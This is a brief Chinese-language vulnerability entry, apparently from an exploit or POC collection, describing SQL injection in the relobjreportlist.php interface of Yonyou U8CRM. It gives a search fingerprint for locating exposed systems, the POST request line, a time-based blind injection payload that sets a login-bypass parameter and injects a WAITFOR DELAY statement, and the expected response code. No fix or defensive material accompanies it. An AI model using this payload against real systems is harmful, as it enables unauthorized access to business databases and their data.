# 用友U8CRM系统接口relobjreportlist.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="用友U8CRM"`
- **请求**：`POST /config/relobjreportlist.php HTTP/1.1`

**Payload**
```
DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200